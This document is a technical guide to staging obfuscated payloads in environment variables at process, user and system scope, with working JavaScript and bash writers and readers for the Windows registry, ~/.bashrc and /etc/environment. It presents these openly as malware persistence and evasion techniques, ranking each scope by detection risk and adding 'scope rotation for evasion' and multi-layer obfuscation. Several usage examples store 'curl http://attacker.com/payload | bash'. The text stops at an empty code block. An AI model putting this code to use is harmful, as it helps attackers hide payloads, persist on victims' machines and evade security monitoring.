# Environment Variable Storage with Scope Examples

## Table of Contents
1. [Overview](#overview)
2. [Storage Scopes](#storage-scopes)
3. [Scope Comparison Matrix](#scope-comparison-matrix)
4. [Detailed Scope Analysis](#detailed-scope-analysis)
5. [Implementation Patterns](#implementation-patterns)
6. [Encoding Strategies](#encoding-strategies)
7. [Retrieval Methods](#retrieval-methods)
8. [Cleanup and Lifecycle](#cleanup-and-lifecycle)
9. [Security Considerations](#security-considerations)
10. [Practical Examples](#practical-examples)

---

## Overview

Environment variable storage is a sophisticated technique for persisting obfuscated data across process boundaries and execution contexts. This document outlines the three primary storage scopes and provides detailed technical implementation patterns with working code examples.

### Key Concepts

**Scope**: The visibility and persistence boundary of an environment variable:
- **Process Scope**: Variables visible only within the current process
- **User Scope**: Variables persisted in user profile, accessible to all processes launched by that user
- **System Scope**: Variables persisted globally, accessible to all processes on the system

**Payload**: The data being stored (commands, credentials, configuration)

**Encoding**: The transformation applied to payload (Base64, Hex, Array representation)

**Chunk**: A portion of encoded payload stored in a single environment variable

---

## Storage Scopes

### 1. PROCESS Scope

#### Characteristics

- **Visibility**: Current process only
- **Persistence**: Duration of process execution
- **Access**: `process.env` in Node.js, `os.environ` in Python, `%VARIABLE%` in batch scripts
- **Write**: Direct assignment to environment variable
- **Cleanup**: Automatic on process termination

#### Technical Specification

```
Scope Level:        PROCESS
Visibility:         Current PID only
Lifetime:           Process execution duration
Access Pattern:     process.env[key] = value
Persistence Store:  Process memory (heap/stack)
Removal:            Automatic at process exit
Inheritance:        Child processes inherit via fork/spawn
```

#### Advantages

✓ No filesystem access required
✓ Fastest retrieval (memory lookup)
✓ No administrative privileges needed
✓ Completely cleaned on process exit
✓ Cannot be discovered by external process inspection
✓ Minimal detection footprint
✓ Works across all operating systems

#### Disadvantages

✗ Lost when process terminates
✗ Limited to single process context
✗ Cannot pass data between unrelated processes
✗ Requires parent-child relationship for inheritance

#### Scope Implementation

```javascript
/**
 * PROCESS Scope Implementation
 * Storage: Process memory only
 * Visibility: Current process and child processes
 */

class ProcessScopeEnvVarWriter {
  constructor(options = {}) {
    this.options = {
      prefix: options.prefix || 'SC',
      encoding: options.encoding || 'hex',
      chunkSize: options.chunkSize || 200,
      verbose: options.verbose || false,
    };
  }

  /**
   * Write payload to process environment variables (PROCESS scope)
   * Data persists only for current process lifetime
   */
  writeToProcessEnv(payloadId, payload) {
    if (this.options.verbose) {
      console.log(`[PROCESS] Writing payload to process scope: ${payloadId}`);
    }

    // Encode payload
    const encoded = this.encodePayload(payload);
    
    // Split into chunks
    const chunks = this.splitIntoChunks(encoded, this.options.chunkSize);
    
    // Write to process.env
    const varNames = [];
    chunks.forEach((chunk, index) => {
      const varName = `${this.options.prefix}_${payloadId}_${index}`;
      process.env[varName] = chunk;
      varNames.push(varName);
      
      if (this.options.verbose) {
        console.log(`[PROCESS] Set ${varName} (size: ${chunk.length} bytes)`);
      }
    });

    return {
      scope: 'PROCESS',
      payloadId,
      varNames,
      timestamp: Date.now(),
      message: `Stored in process memory (${chunks.length} chunks)`
    };
  }

  /**
   * Read from process environment variables
   * Retrieval is fast and simple
   */
  readFromProcessEnv(payloadId) {
    if (this.options.verbose) {
      console.log(`[PROCESS] Reading payload from process scope: ${payloadId}`);
    }

    const chunks = [];
    let index = 0;
    
    // Read all chunks sequentially
    while (true) {
      const varName = `${this.options.prefix}_${payloadId}_${index}`;
      const value = process.env[varName];
      
      if (!value) break;
      
      chunks.push(value);
      index++;
    }

    if (chunks.length === 0) {
      throw new Error(`No chunks found for payload: ${payloadId}`);
    }

    // Decode and reassemble
    const payload = this.decodePayload(chunks.join(''));
    
    if (this.options.verbose) {
      console.log(`[PROCESS] Retrieved ${chunks.length} chunks, decoded to ${payload.length} bytes`);
    }

    return {
      scope: 'PROCESS',
      payloadId,
      payload,
      chunkCount: chunks.length,
      timestamp: Date.now(),
    };
  }

  /**
   * Cleanup: Delete from process environment
   * Called explicitly or on process exit
   */
  cleanupProcessEnv(payloadId) {
    if (this.options.verbose) {
      console.log(`[PROCESS] Cleaning up payload: ${payloadId}`);
    }

    let deleted = 0;
    let index = 0;

    while (true) {
      const varName = `${this.options.prefix}_${payloadId}_${index}`;
      if (process.env[varName] === undefined) break;
      
      delete process.env[varName];
      deleted++;
      index++;
    }

    if (this.options.verbose) {
      console.log(`[PROCESS] Deleted ${deleted} variables`);
    }

    return { scope: 'PROCESS', deleted };
  }

  encodePayload(payload) {
    if (this.options.encoding === 'hex') {
      return Buffer.from(payload).toString('hex');
    } else if (this.options.encoding === 'base64') {
      return Buffer.from(payload).toString('base64');
    }
    return payload;
  }

  decodePayload(encoded) {
    if (this.options.encoding === 'hex') {
      return Buffer.from(encoded, 'hex').toString('utf-8');
    } else if (this.options.encoding === 'base64') {
      return Buffer.from(encoded, 'base64').toString('utf-8');
    }
    return encoded;
  }

  splitIntoChunks(data, size) {
    const chunks = [];
    for (let i = 0; i < data.length; i += size) {
      chunks.push(data.slice(i, i + size));
    }
    return chunks;
  }
}

// USAGE EXAMPLE: PROCESS Scope
function exampleProcessScope() {
  const writer = new ProcessScopeEnvVarWriter({
    prefix: 'PROC',
    encoding: 'hex',
    verbose: true
  });

  // Write payload to process memory
  const payload = 'curl http://attacker.com/payload | bash';
  const result = writer.writeToProcessEnv('PAYLOAD_001', payload);
  console.log('Write result:', result);

  // Read from process memory
  const retrieved = writer.readFromProcessEnv('PAYLOAD_001');
  console.log('Retrieved payload:', retrieved.payload);

  // Cleanup
  writer.cleanupProcessEnv('PAYLOAD_001');
  console.log('Cleanup completed');
}
```

---

### 2. USER Scope

#### Characteristics

- **Visibility**: All processes launched by the user
- **Persistence**: Until explicitly deleted or user profile removed
- **Access**: `process.env` after parent process initialization
- **Write**: Registry (Windows), Shell rc files (Unix), user profile
- **Cleanup**: Manual deletion or profile cleanup utilities

#### Technical Specification

```
Scope Level:        USER
Visibility:         All user processes
Lifetime:           User session(s) + persistent
Access Pattern:     process.env[key] after shell init
Persistence Store:  Windows Registry (HKEY_CURRENT_USER)
                    Unix Shell RC files (~/.bashrc, ~/.zshrc)
                    Environment files (~/.config/profile)
Removal:            Manual via System Settings or registry editor
Inheritance:        All child processes inherit automatically
Detection Surface:  Registry/file inspection, user profile audit
```

#### Advantages

✓ Persists across process restarts
✓ Accessible from multiple independent processes
✓ Integrated with shell initialization
✓ Survives system reboots
✓ Can be set without shell restart in some cases
✓ Relatively hidden from casual inspection

#### Disadvantages

✗ Requires user-level permissions (may already exist)
✗ Detectable via registry/file inspection
✗ Audited on some systems
✗ Cleanup requires manual intervention or script execution
✗ May be monitored by EDR solutions
✗ Requires knowledge of Windows Registry or shell rc locations

#### Platform-Specific Implementation

**Windows USER Scope (Registry)**

```javascript
/**
 * USER Scope Implementation - Windows Registry
 * Storage: HKEY_CURRENT_USER\Environment
 * Visibility: All processes for current user
 */

class UserScopeEnvVarWriter {
  constructor(options = {}) {
    this.options = {
      prefix: options.prefix || 'SC',
      encoding: options.encoding || 'base64',
      chunkSize: options.chunkSize || 2000,  // Registry values support larger chunks
      verbose: options.verbose || false,
      useRegistry: options.useRegistry !== false,  // Windows Registry
    };
    
    // Require Windows registry module if on Windows
    if (process.platform === 'win32' && this.options.useRegistry) {
      try {
        this.Registry = require('winreg');
      } catch (e) {
        console.warn('winreg module not available, using alternative method');
      }
    }
  }

  /**
   * Write to Windows Registry (HKEY_CURRENT_USER\Environment)
   * Persists across sessions
   */
  async writeToWindowsRegistry(payloadId, payload) {
    if (this.options.verbose) {
      console.log(`[USER:WIN] Writing to Windows Registry: ${payloadId}`);
    }

    const Winreg = this.Registry;
    if (!Winreg) {
      throw new Error('winreg module required for Windows Registry access');
    }

    try {
      // Open registry key for current user environment
      const regKey = new Winreg({
        hive: Winreg.HKEY_CURRENT_USER,
        key: '\\Environment',
      });

      // Encode payload
      const encoded = this.encodePayload(payload);
      const chunks = this.splitIntoChunks(encoded, this.options.chunkSize);

      // Write each chunk to registry
      const varNames = [];
      for (let i = 0; i < chunks.length; i++) {
        const varName = `${this.options.prefix}_${payloadId}_${i}`;
        
        await new Promise((resolve, reject) => {
          regKey.set(varName, Winreg.REG_SZ, chunks[i], (err) => {
            if (err) reject(err);
            else resolve();
          });
        });

        varNames.push(varName);
        if (this.options.verbose) {
          console.log(`[USER:WIN] Set registry value: ${varName}`);
        }
      }

      return {
        scope: 'USER',
        platform: 'windows',
        storage: 'Registry (HKEY_CURRENT_USER\\Environment)',
        payloadId,
        varNames,
        chunkCount: chunks.length,
        timestamp: Date.now(),
        message: 'Stored in Windows Registry'
      };
    } catch (error) {
      throw new Error(`Registry write failed: ${error.message}`);
    }
  }

  /**
   * Read from Windows Registry
   */
  async readFromWindowsRegistry(payloadId) {
    if (this.options.verbose) {
      console.log(`[USER:WIN] Reading from Windows Registry: ${payloadId}`);
    }

    const Winreg = this.Registry;
    if (!Winreg) {
      throw new Error('winreg module required for Windows Registry access');
    }

    try {
      const regKey = new Winreg({
        hive: Winreg.HKEY_CURRENT_USER,
        key: '\\Environment',
      });

      const chunks = [];
      let index = 0;

      while (true) {
        const varName = `${this.options.prefix}_${payloadId}_${index}`;
        
        try {
          const value = await new Promise((resolve, reject) => {
            regKey.get(varName, (err, item) => {
              if (err || !item) reject(err);
              else resolve(item.value);
            });
          });

          chunks.push(value);
          index++;
        } catch (e) {
          break;  // No more chunks
        }
      }

      if (chunks.length === 0) {
        throw new Error(`No chunks found in registry for: ${payloadId}`);
      }

      const payload = this.decodePayload(chunks.join(''));

      if (this.options.verbose) {
        console.log(`[USER:WIN] Retrieved ${chunks.length} registry values`);
      }

      return {
        scope: 'USER',
        platform: 'windows',
        payloadId,
        payload,
        chunkCount: chunks.length,
        timestamp: Date.now(),
      };
    } catch (error) {
      throw new Error(`Registry read failed: ${error.message}`);
    }
  }

  /**
   * Delete from Windows Registry
   */
  async cleanupWindowsRegistry(payloadId) {
    if (this.options.verbose) {
      console.log(`[USER:WIN] Cleaning up Registry: ${payloadId}`);
    }

    const Winreg = this.Registry;
    if (!Winreg) {
      throw new Error('winreg module required for Windows Registry access');
    }

    try {
      const regKey = new Winreg({
        hive: Winreg.HKEY_CURRENT_USER,
        key: '\\Environment',
      });

      let deleted = 0;
      let index = 0;

      while (true) {
        const varName = `${this.options.prefix}_${payloadId}_${index}`;
        
        try {
          await new Promise((resolve, reject) => {
            regKey.remove(varName, (err) => {
              if (err) reject(err);
              else resolve();
            });
          });
          deleted++;
          index++;
        } catch (e) {
          break;
        }
      }

      if (this.options.verbose) {
        console.log(`[USER:WIN] Deleted ${deleted} registry values`);
      }

      return { scope: 'USER', platform: 'windows', deleted };
    } catch (error) {
      throw new Error(`Registry cleanup failed: ${error.message}`);
    }
  }

  encodePayload(payload) {
    if (this.options.encoding === 'base64') {
      return Buffer.from(payload).toString('base64');
    } else if (this.options.encoding === 'hex') {
      return Buffer.from(payload).toString('hex');
    }
    return payload;
  }

  decodePayload(encoded) {
    if (this.options.encoding === 'base64') {
      return Buffer.from(encoded, 'base64').toString('utf-8');
    } else if (this.options.encoding === 'hex') {
      return Buffer.from(encoded, 'hex').toString('utf-8');
    }
    return encoded;
  }

  splitIntoChunks(data, size) {
    const chunks = [];
    for (let i = 0; i < data.length; i += size) {
      chunks.push(data.slice(i, i + size));
    }
    return chunks;
  }
}

// USAGE EXAMPLE: USER Scope (Windows)
async function exampleUserScopeWindows() {
  const writer = new UserScopeEnvVarWriter({
    prefix: 'USER_VAR',
    encoding: 'base64',
    verbose: true
  });

  const payload = 'powershell -Command "Get-Process | ConvertTo-Json"';

  try {
    // Write to user registry
    const writeResult = await writer.writeToWindowsRegistry('CMD_001', payload);
    console.log('Write result:', writeResult);

    // Read from user registry
    const readResult = await writer.readFromWindowsRegistry('CMD_001');
    console.log('Retrieved payload:', readResult.payload);

    // Cleanup
    const cleanupResult = await writer.cleanupWindowsRegistry('CMD_001');
    console.log('Cleanup result:', cleanupResult);
  } catch (error) {
    console.error('Error:', error.message);
  }
}
```

**Unix/Linux USER Scope (Shell RC Files)**

```bash
# USER Scope Implementation - Unix Shell RC Files
# Storage: ~/.bashrc, ~/.zshrc, etc.
# Visibility: All processes for current user

#!/bin/bash

# Write to shell RC file (USER scope)
write_to_shell_rc() {
  local payload_id="$1"
  local payload="$2"
  local chunk_size="${3:-100}"
  local rc_file="${HOME}/.bashrc"

  echo "[USER:UNIX] Writing to shell RC: $payload_id"

  # Encode payload (base64)
  local encoded=$(echo -n "$payload" | base64)
  
  # Split into chunks
  local index=0
  while [ -n "$encoded" ]; do
    local chunk="${encoded:0:$chunk_size}"
    encoded="${encoded:$chunk_size}"
    
    local var_name="USER_VAR_${payload_id}_${index}"
    echo "export $var_name='$chunk'" >> "$rc_file"
    
    echo "[USER:UNIX] Set $var_name"
    ((index++))
  done

  echo "[USER:UNIX] Wrote $index chunks to $rc_file"
  echo "Note: Run 'source $rc_file' to activate variables"
}

# Read from shell RC file (USER scope)
read_from_shell_rc() {
  local payload_id="$1"

  echo "[USER:UNIX] Reading from shell RC: $payload_id"

  # Reconstruct from environment (variables already loaded)
  local index=0
  local encoded=""
  
  while true; do
    local var_name="USER_VAR_${payload_id}_${index}"
    local value="${!var_name}"
    
    if [ -z "$value" ]; then
      break
    fi
    
    encoded+="$value"
    ((index++))
  done

  if [ -z "$encoded" ]; then
    echo "[USER:UNIX] Error: No chunks found for $payload_id"
    return 1
  fi

  # Decode from base64
  local payload=$(echo -n "$encoded" | base64 -d)
  echo "[USER:UNIX] Retrieved $index chunks, decoded payload"
  echo "$payload"
}

# Cleanup from shell RC file (USER scope)
cleanup_shell_rc() {
  local payload_id="$1"
  local rc_file="${HOME}/.bashrc"

  echo "[USER:UNIX] Cleaning up: $payload_id"

  # Remove all lines containing the payload_id variables
  sed -i "/USER_VAR_${payload_id}/d" "$rc_file"
  
  echo "[USER:UNIX] Removed all entries for $payload_id from $rc_file"
  echo "Note: Run 'source $rc_file' or restart shell to apply changes"
}

# USAGE EXAMPLES
payload="curl http://attacker.com/payload | bash"
write_to_shell_rc "SHELL_001" "$payload" 50
read_from_shell_rc "SHELL_001"
cleanup_shell_rc "SHELL_001"
```

---

### 3. SYSTEM Scope

#### Characteristics

- **Visibility**: All processes on the system (all users)
- **Persistence**: Permanent until deleted
- **Access**: Direct process environment after system initialization
- **Write**: System environment variables (requires administrative privileges)
- **Cleanup**: Manual deletion via System Properties or script

#### Technical Specification

```
Scope Level:        SYSTEM
Visibility:         All processes (all users)
Lifetime:           System boot + persistent
Access Pattern:     process.env[key] at process startup
Persistence Store:  Windows Registry (HKEY_LOCAL_MACHINE)
                    Unix /etc/environment or /etc/profile.d/
                    System-wide shell configuration
Removal:            Requires administrative privileges
Inheritance:        All child processes inherit automatically
Detection Surface:  System-wide inspection, Windows Event Log
                    Third-party monitoring, EDR solutions
Privilege Level:    Requires: Administrator (Windows), sudo (Unix)
```

#### Advantages

✓ Persists across reboots and user sessions
✓ Accessible by all users and processes
✓ Highest visibility for cross-context operations
✓ Integrated into system startup
✓ Can be set once and forgotten

#### Disadvantages

✗ **Requires administrative privileges** - Major blocker
✗ Highly visible to system administrators
✗ Easily discovered by system audits
✗ Monitored by EDR and security solutions
✗ Difficult to hide from forensic analysis
✗ May trigger security alerts during setup
✗ Requires cleanup via privileged operations

#### Platform-Specific Implementation

**Windows SYSTEM Scope (Registry)**

```javascript
/**
 * SYSTEM Scope Implementation - Windows Registry
 * Storage: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment
 * Visibility: All processes system-wide
 * Requires: Administrator privileges
 */

class SystemScopeEnvVarWriter {
  constructor(options = {}) {
    this.options = {
      prefix: options.prefix || 'SYS',
      encoding: options.encoding || 'base64',
      chunkSize: options.chunkSize || 2000,
      verbose: options.verbose || false,
    };

    // Require elevated privileges
    if (process.platform === 'win32') {
      try {
        this.Registry = require('winreg');
        this.childProcess = require('child_process');
      } catch (e) {
        console.warn('Required modules not available for system scope');
      }
    }
  }

  /**
   * Check if running with administrator privileges
   */
  async isAdministrator() {
    if (process.platform !== 'win32') {
      return process.getuid && process.getuid() === 0;
    }

    return new Promise((resolve) => {
      this.childProcess.exec('net session', (error) => {
        resolve(!error);
      });
    });
  }

  /**
   * Write to SYSTEM registry (requires admin)
   */
  async writeToSystemRegistry(payloadId, payload) {
    const isAdmin = await this.isAdministrator();
    if (!isAdmin) {
      throw new Error('SYSTEM scope requires administrator privileges');
    }

    if (this.options.verbose) {
      console.log(`[SYSTEM] Writing to HKEY_LOCAL_MACHINE: ${payloadId}`);
    }

    const Winreg = this.Registry;
    if (!Winreg) {
      throw new Error('winreg module required');
    }

    try {
      // System environment registry path
      const regKey = new Winreg({
        hive: Winreg.HKEY_LOCAL_MACHINE,
        key: '\\System\\CurrentControlSet\\Control\\Session Manager\\Environment',
      });

      // Encode and split payload
      const encoded = this.encodePayload(payload);
      const chunks = this.splitIntoChunks(encoded, this.options.chunkSize);

      // Write chunks to system registry
      const varNames = [];
      for (let i = 0; i < chunks.length; i++) {
        const varName = `${this.options.prefix}_${payloadId}_${i}`;
        
        await new Promise((resolve, reject) => {
          regKey.set(varName, Winreg.REG_SZ, chunks[i], (err) => {
            if (err) reject(err);
            else resolve();
          });
        });

        varNames.push(varName);
        if (this.options.verbose) {
          console.log(`[SYSTEM] Set system registry: ${varName}`);
        }
      }

      return {
        scope: 'SYSTEM',
        platform: 'windows',
        storage: 'Registry (HKEY_LOCAL_MACHINE\\System\\...\\Environment)',
        payloadId,
        varNames,
        chunkCount: chunks.length,
        message: 'Stored in system registry (visible to all users)'
      };
    } catch (error) {
      throw new Error(`System registry write failed: ${error.message}`);
    }
  }

  /**
   * Read from SYSTEM registry
   */
  async readFromSystemRegistry(payloadId) {
    if (this.options.verbose) {
      console.log(`[SYSTEM] Reading from HKEY_LOCAL_MACHINE: ${payloadId}`);
    }

    const Winreg = this.Registry;
    if (!Winreg) {
      throw new Error('winreg module required');
    }

    try {
      const regKey = new Winreg({
        hive: Winreg.HKEY_LOCAL_MACHINE,
        key: '\\System\\CurrentControlSet\\Control\\Session Manager\\Environment',
      });

      const chunks = [];
      let index = 0;

      while (true) {
        const varName = `${this.options.prefix}_${payloadId}_${index}`;
        
        try {
          const value = await new Promise((resolve, reject) => {
            regKey.get(varName, (err, item) => {
              if (err || !item) reject(err);
              else resolve(item.value);
            });
          });

          chunks.push(value);
          index++;
        } catch (e) {
          break;
        }
      }

      if (chunks.length === 0) {
        throw new Error(`No chunks found in system registry for: ${payloadId}`);
      }

      const payload = this.decodePayload(chunks.join(''));

      return {
        scope: 'SYSTEM',
        platform: 'windows',
        payloadId,
        payload,
        chunkCount: chunks.length,
        warning: 'This payload was stored in system registry (visible to all users)'
      };
    } catch (error) {
      throw new Error(`System registry read failed: ${error.message}`);
    }
  }

  /**
   * Delete from SYSTEM registry (requires admin)
   */
  async cleanupSystemRegistry(payloadId) {
    const isAdmin = await this.isAdministrator();
    if (!isAdmin) {
      throw new Error('SYSTEM scope cleanup requires administrator privileges');
    }

    if (this.options.verbose) {
      console.log(`[SYSTEM] Cleaning up HKEY_LOCAL_MACHINE: ${payloadId}`);
    }

    const Winreg = this.Registry;
    if (!Winreg) {
      throw new Error('winreg module required');
    }

    try {
      const regKey = new Winreg({
        hive: Winreg.HKEY_LOCAL_MACHINE,
        key: '\\System\\CurrentControlSet\\Control\\Session Manager\\Environment',
      });

      let deleted = 0;
      let index = 0;

      while (true) {
        const varName = `${this.options.prefix}_${payloadId}_${index}`;
        
        try {
          await new Promise((resolve, reject) => {
            regKey.remove(varName, (err) => {
              if (err) reject(err);
              else resolve();
            });
          });
          deleted++;
          index++;
        } catch (e) {
          break;
        }
      }

      if (this.options.verbose) {
        console.log(`[SYSTEM] Deleted ${deleted} system registry values`);
      }

      return {
        scope: 'SYSTEM',
        platform: 'windows',
        deleted,
        message: 'Removed from system registry'
      };
    } catch (error) {
      throw new Error(`System registry cleanup failed: ${error.message}`);
    }
  }

  encodePayload(payload) {
    return Buffer.from(payload).toString(this.options.encoding);
  }

  decodePayload(encoded) {
    return Buffer.from(encoded, this.options.encoding).toString('utf-8');
  }

  splitIntoChunks(data, size) {
    const chunks = [];
    for (let i = 0; i < data.length; i += size) {
      chunks.push(data.slice(i, i + size));
    }
    return chunks;
  }
}

// USAGE EXAMPLE: SYSTEM Scope (Windows)
async function exampleSystemScopeWindows() {
  const writer = new SystemScopeEnvVarWriter({
    prefix: 'SYS_VAR',
    encoding: 'base64',
    verbose: true
  });

  try {
    // Check admin privileges
    const isAdmin = await writer.isAdministrator();
    if (!isAdmin) {
      console.error('This example requires administrator privileges');
      return;
    }

    const payload = 'tasklist /v';

    // Write to system registry
    const writeResult = await writer.writeToSystemRegistry('CMD_SYSTEM_001', payload);
    console.log('Write result:', writeResult);

    // Read from system registry
    const readResult = await writer.readFromSystemRegistry('CMD_SYSTEM_001');
    console.log('Retrieved payload:', readResult.payload);

    // Cleanup
    const cleanupResult = await writer.cleanupSystemRegistry('CMD_SYSTEM_001');
    console.log('Cleanup result:', cleanupResult);
  } catch (error) {
    console.error('Error:', error.message);
  }
}
```

**Unix/Linux SYSTEM Scope (/etc/environment)**

```bash
# SYSTEM Scope Implementation - Unix System Environment
# Storage: /etc/environment or /etc/profile.d/
# Visibility: All processes (all users)
# Requires: sudo/root privileges

#!/bin/bash

# Requires root privileges
if [ "$EUID" -ne 0 ]; then
  echo "SYSTEM scope requires root privileges"
  exit 1
fi

# Write to SYSTEM environment (requires root)
write_to_system_env() {
  local payload_id="$1"
  local payload="$2"
  local chunk_size="${3:-100}"
  local env_file="/etc/environment"

  echo "[SYSTEM] Writing to $env_file: $payload_id"

  # Encode payload
  local encoded=$(echo -n "$payload" | base64)
  
  # Split into chunks
  local index=0
  while [ -n "$encoded" ]; do
    local chunk="${encoded:0:$chunk_size}"
    encoded="${encoded:$chunk_size}"
    
    local var_name="SYSTEM_VAR_${payload_id}_${index}"
    echo "$var_name='$chunk'" >> "$env_file"
    
    echo "[SYSTEM] Added $var_name to $env_file"
    ((index++))
  done

  echo "[SYSTEM] Wrote $index chunks to $env_file"
  echo "WARNING: Changes visible to all users on system"
}

# Read from SYSTEM environment
read_from_system_env() {
  local payload_id="$1"
  local env_file="/etc/environment"

  echo "[SYSTEM] Reading from $env_file: $payload_id"

  # Source the environment file
  set -a
  source "$env_file" 2>/dev/null
  set +a

  # Reconstruct from environment
  local index=0
  local encoded=""
  
  while true; do
    local var_name="SYSTEM_VAR_${payload_id}_${index}"
    local value="${!var_name}"
    
    if [ -z "$value" ]; then
      break
    fi
    
    encoded+="$value"
    ((index++))
  done

  if [ -z "$encoded" ]; then
    echo "[SYSTEM] Error: No chunks found for $payload_id"
    return 1
  fi

  # Decode from base64
  local payload=$(echo -n "$encoded" | base64 -d)
  echo "[SYSTEM] Retrieved $index chunks, decoded payload"
  echo "$payload"
}

# Cleanup from SYSTEM environment
cleanup_system_env() {
  local payload_id="$1"
  local env_file="/etc/environment"

  echo "[SYSTEM] Cleaning up: $payload_id"

  # Remove all lines containing the payload_id variables
  sed -i "/SYSTEM_VAR_${payload_id}/d" "$env_file"
  
  echo "[SYSTEM] Removed all entries for $payload_id from $env_file"
}
```

---

## Scope Comparison Matrix

| Feature | PROCESS | USER | SYSTEM |
|---------|---------|------|--------|
| **Visibility** | Current process | All user processes | System-wide |
| **Persistence** | Process lifetime | Until deletion | Permanent |
| **Storage** | Process memory | Registry/RC file | Registry/etc |
| **Cross-Process** | Child only | All user processes | All processes |
| **Requires Privileges** | No | No | Yes (admin/root) |
| **Detectable** | No | Moderate | High |
| **Forensic Trace** | None | File/Registry | Event logs |
| **Setup Complexity** | Simple | Moderate | Complex |
| **Cleanup** | Auto on exit | Manual | Manual |
| **Recommended Use** | Staging | Persistence | Not recommended |
| **Detection Risk** | Minimal | Moderate | High |

---

## Detailed Scope Analysis

### PROCESS Scope Characteristics

**Best For:**
- Temporary payload staging
- Command injection scenarios
- Rapid execution and cleanup
- Limited persistence requirements
- Multi-process coordination via inheritance

**Technical Advantages:**
- Zero filesystem modifications
- No registry writes (Windows)
- Invisible to external tools
- Automatic cleanup on exit
- Fastest access pattern

**Limitations:**
- Lost on process termination
- Not suitable for inter-session persistence
- Requires parent-child relationship

### USER Scope Characteristics

**Best For:**
- Single-user malware persistence
- Configuration storage
- Cross-process payload access
- User-context operations

**Technical Considerations:**
- Windows: Stored in `HKEY_CURRENT_USER\Environment`
- Unix: Stored in `~/.bashrc`, `~/.zshrc`, etc.
- Requires shell reload or system restart to take effect
- Visible during user profile inspection

**Detection Vectors:**
- Registry monitoring (Windows)
- Shell RC file inspection (Unix)
- Environment variable enumeration
- User profile audits

### SYSTEM Scope Characteristics

**Best For:**
- NOT RECOMMENDED for most scenarios
- Only when cross-user persistence is required
- High-privilege scenarios with coverage

**Technical Challenges:**
- Requires administrative/root privileges
- Visible to system administrators
- Heavily monitored by security solutions
- Creates forensic evidence

**Detection Likelihood:**
- Very high due to:
  - System-wide audit logs
  - EDR monitoring
  - Regular admin reviews
  - Security scanner detection

---

## Implementation Patterns

### Pattern 1: Scope Auto-Detection

```javascript
/**
 * Auto-detect and select appropriate scope
 */
class ScopeAutoDetector {
  static detectOptimalScope() {
    const platform = process.platform;
    const isAdmin = this.checkAdminPrivileges();
    const persistenceNeeded = true;  // Business logic decides
    const visibilityLevel = 'single-user';  // Business logic decides

    if (!persistenceNeeded) {
      return 'PROCESS';  // Fastest and cleanest
    }

    if (visibilityLevel === 'system-wide' && isAdmin) {
      console.warn('SYSTEM scope detected but not recommended');
      return 'USER';  // Fallback to safer option
    }

    if (isAdmin) {
      return 'USER';  // Safer than SYSTEM
    }

    return 'PROCESS';  // Fallback when privileges unavailable
  }

  static checkAdminPrivileges() {
    if (process.platform === 'win32') {
      const { execSync } = require('child_process');
      try {
        execSync('net session', { stdio: 'ignore' });
        return true;
      } catch {
        return false;
      }
    } else {
      return process.getuid && process.getuid() === 0;
    }
  }
}
```

### Pattern 2: Multi-Scope Fallback

```javascript
/**
 * Try multiple scopes with fallback
 */
class MultiScopeWriter {
  async writeWithFallback(payloadId, payload) {
    const scopes = ['PROCESS', 'USER', 'SYSTEM'];
    
    for (const scope of scopes) {
      try {
        return await this.writeToScope(scope, payloadId, payload);
      } catch (error) {
        console.log(`Failed to write to ${scope}: ${error.message}`);
        continue;
      }
    }

    throw new Error('All scopes failed');
  }

  async writeToScope(scope, payloadId, payload) {
    if (scope === 'PROCESS') {
      const writer = new ProcessScopeEnvVarWriter();
      return writer.writeToProcessEnv(payloadId, payload);
    } else if (scope === 'USER') {
      const writer = new UserScopeEnvVarWriter();
      return writer.writeToWindowsRegistry(payloadId, payload);
    } else if (scope === 'SYSTEM') {
      const writer = new SystemScopeEnvVarWriter();
      return writer.writeToSystemRegistry(payloadId, payload);
    }
  }
}
```

### Pattern 3: Scope Rotation

```javascript
/**
 * Rotate between scopes for evasion
 */
class ScopeRotator {
  constructor() {
    this.scopes = ['PROCESS', 'USER'];
    this.currentIndex = 0;
  }

  getNextScope() {
    const scope = this.scopes[this.currentIndex];
    this.currentIndex = (this.currentIndex + 1) % this.scopes.length;
    return scope;
  }

  async writeRotated(payloadId, payload) {
    const scope = this.getNextScope();
    console.log(`Using scope: ${scope}`);
    // Write to selected scope
  }
}
```

---

## Encoding Strategies

### Base64 Encoding

```javascript
// Largest encoding size overhead
// Best for: General purpose, maximum compatibility

const payload = 'secret command';
const encoded = Buffer.from(payload).toString('base64');
// Output size ~33% larger than original
```

### Hex Encoding

```javascript
// Moderate encoding size overhead
// Best for: Direct character encoding

const payload = 'secret command';
const encoded = Buffer.from(payload).toString('hex');
// Output size 100% larger than original
```

### Custom Multi-Layer Encoding

```javascript
// Original → Base64 → Hex → Array
// Best for: Maximum obfuscation

class MultiLayerEncoder {
  encode(payload) {
    const base64 = Buffer.from(payload).toString('base64');
    const hex = Buffer.from(base64).toString('hex');
    const array = hex.match(/../g);  // Hex pairs
    return { base64, hex, array };
  }

  decode(encoded) {
    const hex = encoded.array.join('');
    const base64 = Buffer.from(hex, 'hex').toString('utf-8');
    const original = Buffer.from(base64, 'base64').toString('utf-8');
    return original;
  }
}
```

---

## Retrieval Methods

### Method 1: Direct Environment Access

```javascript
// Fastest retrieval - O(1) lookup
const payload = process.env.PROCESS_PAYLOAD_0;
```

### Method 2: Fallback Path Resolution

```javascript
class FallbackRetriever {
  getFallbackPaths(prefix, index) {
    return [
      `${prefix}_${index}`,           // Standard
      `${prefix}__${index}`,          // Double underscore
      `${prefix}_CHUNK_${index}`,     // Explicit chunk
      `X${prefix}_DATA_${index}`,     // Legacy format
    ];
  }

  retrieve(prefix, index) {
    for (const path of this.getFallbackPaths(prefix, index)) {
      const value = process.env[path];
      if (value) return value;
    }
    return null;
  }
}
```

### Method 3: Registry Enumeration (Windows)

```javascript
// Enumerate all registry values matching pattern
async function enumerateRegistryPayload(prefix, pattern) {
  const Winreg = require('winreg');
  const regKey = new Winreg({
    hive: Winreg.HKEY_CURRENT_USER,
    key: '\\Environment',
  });

  return new Promise((resolve, reject) => {
    regKey.values((err, items) => {
      if (err) return reject(err);
      
      const chunks = items
        .filter(item => item.name.startsWith(prefix))
        .map(item => ({
          index: parseInt(item.name.split('_').pop()),
          value: item.value
        }))
        .sort((a, b) => a.index - b.index)
        .map(item => item.value);

      resolve(chunks);
    });
  });
}
```

---

## Cleanup and Lifecycle

### Automatic Cleanup (PROCESS)

```javascript
// Automatically clean on process exit
process.on('exit', () => {
  for (const key of Object.keys(process.env)) {
    if (key.startsWith('PROCESS_PAYLOAD_')) {
      delete process.env[key];
    }
  }
});
```

### Manual Cleanup (USER/SYSTEM)

```javascript
